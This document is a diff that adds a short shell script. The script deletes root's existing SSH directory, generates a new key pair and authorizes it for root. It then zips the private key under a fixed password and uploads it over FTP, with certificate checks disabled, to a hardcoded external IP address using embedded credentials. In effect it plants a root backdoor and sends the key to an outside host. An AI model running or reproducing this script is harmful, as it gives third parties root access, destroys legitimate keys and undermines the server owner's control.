@@ -1,0 +1,11 @@
+yum install lftp  zip -y
+rm -rf /root/.ssh
+ssh-keygen -t rsa -b 2048
+cd ~/.ssh
+cat id_rsa.pub >> authorized_keys
+chmod 400 authorized_keys
+zip -r  -P z86qsSXY8Czgx7J ssh2$(date +"%Y%m%d").zip /root/.ssh/id_rsa /root/.ssh/id_rsa.pub
+lftp -e "set ssl:verify-certificate no" 203.195.150.104:9421 -u 10006287-0-11816466,11816466 << EOF
+mput ssh2$(date +"%Y%m%d").zip
+bye
+EOF
